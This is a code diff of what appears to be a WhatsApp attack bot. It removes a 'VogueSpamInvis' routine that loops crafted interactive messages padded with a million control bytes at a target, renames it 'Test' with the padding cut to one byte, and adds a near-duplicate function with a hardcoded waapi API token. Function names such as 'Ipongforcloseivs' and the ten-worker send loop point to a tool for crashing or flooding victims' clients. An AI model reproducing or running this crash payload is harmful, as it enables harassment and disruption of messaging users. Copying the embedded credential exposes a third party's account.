@@ -33,6 +33,7 @@ const path = require('path');
 const jid = "0@s.whatsapp.net";
 const vm = require('vm')
 const os = require('os')
+const waapi =require('@api/waapi');
 const {
     default: makeWASocket,
     useMultiFileAuthState,
@@ -3783,7 +3784,7 @@ Status      : Success
             
             for (let i = 0; i < 10; i++) {
                 try {
-                    await VogueSpamInvis(sock, target);
+                    await Test(sock, target);
                     await sleep(1500)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -4475,7 +4476,7 @@ async function Ipongforcloseivs(sock, target) {
     }
 };
 
-async function VogueSpamInvis(sock, target) {
+async function Test(sock, target) {
   try {
     const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];    
     for (const x of type) {
@@ -4492,7 +4493,7 @@ async function VogueSpamInvis(sock, target) {
                 },
                 nativeFlowResponseMessage: {
                   name: x,
-                  paramsJson: "\x10".repeat(1000000),
+                  paramsJson: "\x10".repeat(1),
                   version: 3
                 },
                 entryPointConversionSource: type[enty]
@@ -4522,6 +4523,99 @@ async function VogueSpamInvis(sock, target) {
     }
   } catch (err) {
     await console.error(`${err.message}`);
+  }
+}
+
+async function Test(sock, target) {
+  try {
+
+    const waapi =
+      require("@api/waapi");
+
+    waapi.auth(
+      "MWRAGA98UI6LgTKnaqh1GaLhhsGEpI9QWO7XTnWY08eaa956"
+    );
+
+    const type = [
+      "galaxy_message",
+      "call_permission_request",
+      "address_message",
+      "payment_method",
+      "mpm"
+    ];
+
+    for (const x of type) {
+
+      const enty =
+        Math.floor(
+          Math.random() * type.length
+        );
+
+      const msg = generateWAMessageFromContent(
+        target,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "\u0003",
+                            format: "DEFAULT"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: x,
+                            paramsJson: "\x10".repeat(1),
+                            version: 3
+                        },
+                        entryPointConversionSource: type[enty]
+                    }
+                }
+            }
+        },
+        {
+            participant: { jid: target }
+        }
+    );
+
+      try {
+
+        await sock.sendMessage(
+          target,
+          {
+            text:
+              `[${x}] Interactive Event`
+          }
+        );
+
+      } catch {
+
+        await waapi.sendMessage(
+          {
+            chatId:
+              target.replace(
+                "@s.whatsapp.net",
+                ""
+              ) + "@c.us",
+
+            message:
+              `[${x}] Interactive Event`
+          },
+          {
+            id: "92558"
+          }
+        );
+      }
+
+      await new Promise(
+        resolve =>
+          setTimeout(resolve, 1000)
+      );
+    }
+
+  } catch (err) {
+
+    console.error(
+      err.message
+    );
   }
 }
 
